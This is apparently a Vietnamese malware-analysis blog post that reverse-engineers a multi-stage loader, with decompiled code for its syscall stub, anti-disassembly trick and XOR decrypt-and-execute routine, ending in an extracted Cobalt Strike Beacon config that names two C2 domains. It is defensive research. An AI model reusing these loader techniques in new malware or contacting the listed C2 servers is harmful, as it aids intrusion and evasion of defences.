---
title: "[MA] A Cobalt Strike Beacon Loader"
description: "Phân tích một mẫu malware nhiều giai đoạn, từ unpack đến giải mã và chạy payload Cobalt Strike Beacon"
author: ngname
date: 2025-09-05 13:33 +0700
categories: [Malware Analysis]
tags: [windows, malware analysis, packed, cobalt strike beacon]
pin: true
comments: true
---



## Phân tích

Có 2 file 1 file EXE (MD5: `4f41fd89ad4a8e8ad94643cf394922c8`) và 1 file DLL (MD5: `c36f27ed074c9d28c44a90470fa02bcd`)

Khi kiểm tra file DLL thấy export một hàm

```c
__int64 MyCustomAction()
{
  CHAR CommandLine[272]; // [rsp+30h] [rbp-238h] BYREF
  CHAR Buffer[272]; // [rsp+140h] [rbp-128h] BYREF

  GetSystemDirectoryA(Buffer, 0x104u);
  memset(CommandLine, 0, 0x104u);
  snprintf((int)CommandLine, 260, "%s\\%s", pszPath, "VESCollector.exe");
  CreateProcessA_wrapper(CommandLine);
  return 0;
}
```

Hàm này đang ghép đường dẫn `pszPath/VESCollector.exe` vào `CommandLine` rồi chạy nó bằng `CreateProcessA` có thể `VESCollector.exe` là file EXE cần phân tích

Muốn biết file exe này ở đâu ta sẽ debug và đặt breakpoint tại `snprintf((int)CommandLine, 260, "%s\\%s", pszPath, "VESCollector.exe");` 

Vì `pszPath` là tham số thứ 4 nên sẽ nằm ở thanh ghi R9

![IMAGE](/assets/img/MA-ACSBL/pszPath.PNG)

Vậy `pszPath` ở đây là `C:\\Users\\admin\\Desktop`, đây là thư mục mà tôi đang thực hiện debug sau khi chạy thêm một vài lần nữa trên các thư mục khác nhau thì xác nhận được `pszPath` chính là thư mục hiện tại mà file DLL thực thi. Nhiều khả năng đây là một DLL thuộc về một phần mềm cài đặt độc hại, được sử dụng như một custom action để chạy `VESCollector.exe` nên tiếp theo sẽ phân tích file EXE

### Stage 1

Xem header của file thì thấy có  header `UPX` => khả năng cao file đã bị pack nhưng sử dụng UPX lại không thể unpack được nên có lẽ sẽ phải tự dump ra

Khi đưa file exe vào IDA thì không nhận được entrypoint cho nên tôi đưa vào x64dbg lấy địa chỉ của chương trình sau đó rebase lại trong IDA thì thấy được phần xử lí chính của mã độc nằm ở `start_0` 

**start_0**

Hàm này rất to và bị obfuscated rất nặng. Khi phân tích lướt qua thì có thể thấy nó sử dụng biến `ImageBaseAddress` lấy từ struct `ImageBaseAddress`, vậy có thể file này sẽ tự giải mã nó. Đây sẽ là địa chỉ bắt đầu của chương trình trong bộ nhớ, vậy ta sẽ phải đi tìm cách chương trình deobf, giải mã như nào

Sau đó tôi tiếp tục kiểm tra các hàm được gọi xem xử lí như thế nào, sau 1 hồi thì tìm được hàm sau không bị obfuscated lắm

```c
__int64 __fastcall SYSCALL_SMT()
{
  __int64 result; // rax

  __asm { pushf }
  if ( !__ROL4__(
          (-__ROL4__(
              (-__ROL4__((-__ROL4__(-1229049527, 195) - 725638253) ^ 0xB6127E19, 24) - 1778968461) ^ 0xC5D27FDA,
              253)
         - 1520376212)
        ^ 0xC6ED5DF2,
          19) )
    __asm { popf }
  _CF = 0;
  _OF = 0;
  _ZF = 1;
  _SF = 0;
  __asm { pushf }
  result = (unsigned int)__ROL4__(
                           (-__ROL4__(
                               (-__ROL4__((-__ROL4__(1850981825, 235) - 1932469358) ^ 0x8226BB17, 194) - 1541345195)
                             ^ 0xE51EDE2B,
                               72)
                          - 469000902)
                         ^ 0xD26E4BA6,
                           252);
  __asm { popf }
  __asm { syscall; Low latency system call }
  return result;
}
```

Hàm này gọi syscall gì đó nên tạm đặt tên là `SYSCALL_SMT`. Muốn biết nó đang gọi gì thì ta chỉ cần đặt breakpoint tại lúc chương trình gọi hàm rồi chạy đến là biết. 

Do một vài lần đầu chạy không được, tôi đoán là do có sử dụng kỹ thuật anti debug nên dùng plugin scylla hide với profile basic và nhảy đến được breakpoint. `NtAllocateVirtualMemory`

Lúc đầu không có gì nhưng về sau t nhận ra đây là một vòng lặp, vậy chạy thêm một vài lần nữa và dump thanh ghi rbx sẽ thấy header file exe. Vậy hàm `start_0` này khả năng cao là 1 stubloader

Dump ở memorymap ra sau đó phân tích tiếp file exe đã được unpack

### Stage 2

Rebase lại chương trình như stage 1

```
void __fastcall start_0()
{
  __asm { pushf }
  if ( !__ROL4__((-__ROL4__(-70818601, 33) - 2111573739) ^ 0x8A952766, 24) )
    __asm { popf }
  unk_7FF605DFE080 = 1;
  ((void (*)(void))loc_7FF605E05A79)();
  JUMPOUT(0x7FF605E077DCLL);
}
```

Vì hàm `start_0` không có gì nhiều nên là tôi thử lựa chọn make function (phím `p`) của IDA `loc_7FF605E05A79` thì bị báo lỗi **.init:00007FF605E0648B: The function has undefined instruction/data at the specified address.**

Nhảy đến địa chỉ này trong IDA

```
.init:00007FF605E0648A
.init:00007FF605E0648A loc_7FF605E0648A:                       ; CODE XREF: .init:loc_7FF605E0648A↑j
.init:00007FF605E0648A                 jmp     short near ptr loc_7FF605E0648A+1
```

Có lẽ chương trình đã sử dụng kỹ thuật anti-disassembly để gây khó cho phân tích tĩnh, đây là một vòng lặp vô tận và IDA không nhận dạng được. Ta chỉ cần patch lại đoạn này thành nop `0x90` thì sẽ không gặp lỗi nữa. `Edit>Patch Program>Asemble` sẽ phải thực hiện 3 lần, cứ sau mỗi lần thì quay lại `loc_7FF605E05A79` và make function lại nếu lỗi sẽ chỉ đến địa chỉ tiếp theo cần patch. Sau khi thành công ta sẽ có hàm `sub_7FF605E05A79` 

```
void __fastcall start_0()
{
  __asm { pushf }
  if ( !__ROL4__((-__ROL4__(-70818601, 33) - 2111573739) ^ 0x8A952766, 24) )
    __asm { popf }
  dword_7FF605DFE080 = 1;
  ((void (*)(void))sub_7FF605E05A79)();
  JUMPOUT(0x7FF605E077DCLL);
}
```

Mã giả của stage2 cũng bị obfuscate khá nặng

Xem qua thì hầu hết các hàm trong đây đều là wrapper cho một hàm cơ bản khác hoặc không làm gì đáng ngờ cả. Để ý có thấy `loc_7FF605E109EC` và `loc_7FF605E17C4A` IDA cũng không nhận diện là function được, để vá lại ta làm tương tự như với hàm `start_0`

Sau khi patch thì thấy `loc_7FF605E17C4A` có gọi đến 2 Windows API là `GetCurrentProcess` và `WaitForSingleObject` nên tập trung vào phân tích nó

Kiểm tra `loc_7FF605E17C4A`, thấy ở cuối có đoạn này gọi `GetCurrentProcess` lấy handle của process đang chạy nên tôi sẽ phân tích thêm

```c
Init_Once();
((void (__fastcall *)(_QWORD))Loader_DecryptBlobAndExecute)(0);
v4 = (void (*)(void))GetCurrentProcess;
```

Tiếp tục gặp được một đoạn dường như đang giải mã gì đó sau đó `free`

```c
v35 = unk_7FF605DA4024;
v36 = malloc_wrapper(unk_7FF605DA4024);
qmemcpy(v36, &unk_7FF605DA4038, v35);
((void (__fastcall *)(void *, _QWORD, void *))Decode_And_Exec)(v36, (unsigned int)v35, &unk_7FF605DA4028);
return ((__int64 (__fastcall *)(void *))free_wrapper)(v36);
```

Cuối cùng là hàm `Decode_And_Exec` 

```c
// positive sp value has been detected, the output may be wrong!
__int64 __fastcall Decode_And_Exec(__int64 a1, __int64 a2, __int64 a3)
{
  char *v7; // rax
  LPVOID v8; // rbx
  __int64 v9; // rbp
  __int64 v10; // rdi
  int v11; // esi
  unsigned __int64 v12; // r12
  int v13; // eax
  char *v15; // rax
  char *v20; // rax
  HANDLE CurrentProcess; // rax
  char *v27; // [rsp-A0h] [rbp-A0h]
  __int64 v28; // [rsp-30h] [rbp-30h] BYREF

  v27 = v7;
  __asm { pushf }
  __asm { pushf }
  v13 = __ROL4__((-__ROL4__((-__ROL4__(-1463982321, 91) - 1422867133) ^ 0xF28ADE42, 247) - 1398545605) ^ 0x87B43339, 1);
  __asm { popf }
  while ( 1 )
  {
    while ( v13 == 2 )
    {
      __asm { popf }
      v15 = v27;
LABEL_13:
      a2 = (unsigned __int8)v15 & 7;
      LOBYTE(a2) = v15[v10] ^ *(_BYTE *)(v9 + a2);
      v15[(_QWORD)v8] = a2;
      v20 = v15 + 1;
      _CF = v11 < (unsigned int)v20;
      _OF = __OFSUB__(v11, (_DWORD)v20);
      _ZF = v11 == (_DWORD)v20;
      _SF = v11 - (int)v20 < 0;
      v27 = v20;
      if ( v11 > (int)v20 )
      {
        __asm { pushf }
        __asm { pushf }
        v13 = __ROL4__(
                (-__ROL4__(
                    (-__ROL4__((-__ROL4__(1498771544, 121) - 758158913) ^ 0xE5F77D6C, 18) - 1118225126) ^ 0xE62EDBF7,
                    76)
               - 710042124)
              ^ 0x8843D96A,
                9);
        __asm { popf }
      }
      else
      {
        __asm { pushf }
        __asm { pushf }
        v13 = __ROL4__((-__ROL4__(-126428132, 171) - 2025236882) ^ 0xD0686EB3, 93);
        __asm { popf }
      }
    }
    if ( !v13 )
    {
      __asm { popf }
      v13 = (int)v27;
      goto LABEL_10;
    }
    if ( v13 == 3 )
      break;
    if ( v13 == 1 )
    {
      __asm { popf }
      v8 = HeapReAlloc((HANDLE)v12, 0, v27, v11);
      v15 = 0;
      goto LABEL_13;
    }
LABEL_10:
    v27 = (char *)v12;
    v10 = a1;
    v11 = a2;
    v9 = a3;
    v12 = (unsigned int)(v13 - 37439);
    v8 = HeapAlloc(
           (HANDLE)v12,
           0,
           (unsigned int)__ROL4__(
                           (-__ROL4__((-__ROL4__(977798894, 52) - 1888330253) ^ 0xE9FC1700, 194) - 1469099822)
                         ^ 0x82A4C703,
                           149));
    _CF = 0;
    _OF = 0;
    _ZF = v11 == 0;
    _SF = v11 < 0;
    if ( v11 <= 0 )
    {
      __asm { pushf }
      __asm { pushf }
      v13 = __ROL4__(
              (-__ROL4__(
                  (-__ROL4__((-__ROL4__(698698015, 115) - 1297072484) ^ 0xE181C9D3, 130) - 71020820) ^ 0xAACDF2B0,
                  183)
             - 941738174)
            ^ 0xDCA621F2,
              129);
      __asm { popf }
    }
    else
    {
      __asm { pushf }
      __asm { pushf }
      v13 = __ROL4__(
              (-__ROL4__(
                  (-__ROL4__((-__ROL4__(-1773023112, 105) - 831027411) ^ 0x8C2B72C3, 176) - 1925057911) ^ 0x8464AA99,
                  131)
             - 315766952)
            ^ 0x9C4EBEAF,
              164);
      __asm { popf }
    }
  }
  __asm { popf }
  ((void (__fastcall *)(__int64, __int64, __int64))Install_Sleep_Hook)(a1, a2, a3);
  ((void (__fastcall *)(LPVOID))Resolve_Kernel32)(v8);
  CurrentProcess = GetCurrentProcess();
  return ((__int64 (__fastcall *)(__int64 *, _QWORD, _QWORD, HANDLE, __int64, LPVOID, _DWORD, _QWORD, _QWORD, _QWORD, _QWORD))Do_Smt_With_Memory)(
           &v28,
           (unsigned int)__ROL4__(
                           (-__ROL4__(
                               (-__ROL4__((-__ROL4__(1405423904, 69) - 903004242) ^ 0xE5C5A6A8, 136) - 769093269)
                             ^ 0x9B4B047E,
                               249)
                          - 1087085036)
                         ^ 0xCD07C56C,
                           67),
           0,
           CurrentProcess,
           0x7FF605DA158BLL,
           v8,
           0,
           0,
           0,
           0,
           0);
}
```

Chuẩn bị vùng nhớ

- Lấy một handle heap và đưa vào `v12`

- Cấp phát `v8 = HeapAlloc(v12, 0, N)` với kích thước N

Giải mã payload

-  Khối dữ liệu ở `a1` được XOR theo bảng 8-byte nằm ở `a3`, dài `a2` byte, lưu ra vùng heap `v8`

Resolve Kernel32.dll

Lấy handle của chương trình hiện tại và làm gì đó tác động lên bộ nhớ chương trình (Có thể là chạy hoặc ghi do hàm có khá nhiều tham số)

Được rồi vậy bây giờ thử debug xem hàm này đang muốn làm gì với vùng nhớ `v8` được cấp phát, đặt breakpoint tại địa chỉ gọi hàm `Do_Smt_With_Memory`

![IMAGE](/assets/img/MA-ACSBL/Do_Smt_With_Memory.PNG)

> Như trên ảnh, payload được mã hoá sẽ nằm ở thanh ghi RBX và độ lớn của nó nằm ở thanh ghi RSI

Nhìn vào đầu thấy string `MZARUH`, đây là header của `Cobalt strike beacon`

Dump địa chỉ trên ra máy để phân tích. Bởi vì kích cỡ của payload khá lớn nên tôi đã dùng x64dbg dump toàn bộ memory map của địa chỉ đó

### Stage 3

Để phân tích một `Cobalt strike beacon` ta có thể dùng `1768.py` để dump config

```
PS C:\Users\admin\Desktop> python .\1768.py .\stage2_000001CC8D2C0000.bin
File: .\stage2_000001CC8D2C0000.bin
xorkey b'.' 2e
0x0001 payload type                     0x0001 0x0002 1 windows-beacon_dns-reverse_http
0x0002 port                             0x0001 0x0002 53
0x0003 sleeptime                        0x0002 0x0004 10000
0x0004 maxgetsize                       0x0002 0x0004 1399652
0x0005 jitter                           0x0001 0x0002 47
0x0007 publickey                        0x0003 0x0100 30819f300d06092a864886f70d010101050003818d0030818902818100851390879490412562d0202609060eb7c2ee20c3a32685aa3157ae8690bc21358213cebf752d6f842fde490ae54987ee78f9a721ebf3e0157d7d2d47eda16bbfae68960310be99b5c0bcf7ae8da194ad1b8446ba1516e9511723c78868f6c88256054fecb1aad81c61ccf971649dab6ff81a95abd7a5a6f3068ee01261b7dfcb020301000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
0x0008 server,get-uri                   0x0003 0x0100 'ns2.lucclass.store,/preload,cdn.vnbcom.store,/preload'
0x0043 DNS_STRATEGY                     0x0001 0x0002 2
0x0044 DNS_STRATEGY_ROTATE_SECONDS      0x0002 0x0004 -1
0x0045 DNS_STRATEGY_FAIL_X              0x0002 0x0004 5
0x0046 DNS_STRATEGY_FAIL_SECONDS        0x0002 0x0004 -1
0x000e SpawnTo                          0x0003 0x0010 (NULL ...)
0x001d spawnto_x86                      0x0003 0x0040 '%windir%\\syswow64\\rundll32.exe'
0x001e spawnto_x64                      0x0003 0x0040 '%windir%\\sysnative\\rundll32.exe'
0x001f CryptoScheme                     0x0001 0x0002 0
0x001a get-verb                         0x0003 0x0010 'GET'
0x001b post-verb                        0x0003 0x0010 'POST'
0x001c HttpPostChunk                    0x0002 0x0004 96
0x0025 license-id                       0x0002 0x0004 987654321
0x0024 deprecated                       0x0003 0x0020 'NtZOV6JzDr9QkEnX6bobPg=='
0x0026 bStageCleanup                    0x0001 0x0002 1
0x0027 bCFGCaution                      0x0001 0x0002 0
0x004c                                  0x0002 0x0004 16
0x0047 MAX_RETRY_STRATEGY_ATTEMPTS      0x0002 0x0004 0
0x0048 MAX_RETRY_STRATEGY_INCREASE      0x0002 0x0004 0
0x0049 MAX_RETRY_STRATEGY_DURATION      0x0002 0x0004 0
0x0006 maxdns                           0x0001 0x0002 255
0x0013 DNS_Idle                         0x0002 0x0004 134744072 8.8.8.8
0x0014 DNS_Sleep                        0x0002 0x0004 0
0x003c DNS_beacon                       0x0003 0x0021 'ntp.'
0x003d DNS_A                            0x0003 0x0021 'ntp-a.'
0x003e DNS_AAAA                         0x0003 0x0021 'ntp-4a.'
0x003f DNS_TXT                          0x0003 0x0021 'ntp-tx.'
0x0040 DNS_metadata                     0x0003 0x0021 'ntp-mx'
0x0041 DNS_output                       0x0003 0x0021 'ntp-ox.'
0x0042 DNS_resolver                     0x0003 0x000f (NULL ...)
0x0036 HostHeader                       0x0003 0x0080 (NULL ...)
0x0032 UsesCookies                      0x0001 0x0002 0
0x0023 proxy_type                       0x0001 0x0002 2 IE settings
0x003a TCP_FRAME_HEADER                 0x0003 0x0080 '\x00\x04'
0x0039 SMB_FRAME_HEADER                 0x0003 0x0080 '\x00\x04'
0x0037 EXIT_FUNK                        0x0001 0x0002 0
0x0028 killdate                         0x0002 0x0004 0
0x0029 textSectionEnd                   0x0002 0x0004 1
0x002a ObfuscateSectionsInfo            0x0003 0x0028 '\x00\x10\x03\x00°\x0c\x04\x00\x00\x10\x04\x00H(\x05\x00\x000\x05\x00|S\x05\x00\x00`\x05\x00Æo\x05'
0x002b process-inject-start-rwx         0x0001 0x0002 64 PAGE_EXECUTE_READWRITE
0x002c process-inject-use-rwx           0x0001 0x0002 64 PAGE_EXECUTE_READWRITE
0x002d process-inject-min_alloc         0x0002 0x0004 0
0x002e process-inject-transform-x86     0x0003 0x0100 (NULL ...)
0x002f process-inject-transform-x64     0x0003 0x0100 (NULL ...)
0x0035 process-inject-stub              0x0003 0x0010 '®Züþè\x02ftÜ\x8f;O-¤l\x7f'
0x0033 process-inject-execute           0x0003 0x0080 '\x01\x02\x03\x04'
0x0034 process-inject-allocation-method 0x0001 0x0002 0
0x0030 DEPRECATED_PROCINJ_ALLOWED       0x0001 0x0002 1
0x0010 killdate_year                    0x0001 0x0002 0
0x004a                                  0x0003 0x0020 "å\x14B'è\x02fl¯º\x02#\x18Í\x1dNË0¦Í§S\x02[¯èM\x01LÃQB"
0x0011 killdate_month                   0x0002 0x0004 2
0x0000
Guessing Cobalt Strike version: 4.4 (max 0x004c)
Sanity check Cobalt Strike config: OK
Public key config entry found: 0x00043ade (xorKey 0x2e) (LSFIF: b'.-.,.*..\t>.*.,.*.;uJ.+./.,.')
Public key header found: 0x00043ae4 (xorKey 0x2e) (LSFIF: b'.-.,.*..\t>.*.,.*.;uJ.+./.,.')
```

**Domain C2**

- `ns2.lucclass.store`
- `cdn.vnbcom.store`

**C2 path:** `/preload` 

**Port:** `53` đây là port của DNS 

```
DNS_beacon   : ntp.
DNS_A        : ntp-a.
DNS_AAAA     : ntp-4a.
DNS_TXT      : ntp-tx.
DNS_metadata : ntp-mx
DNS_output   : ntp-ox.
```
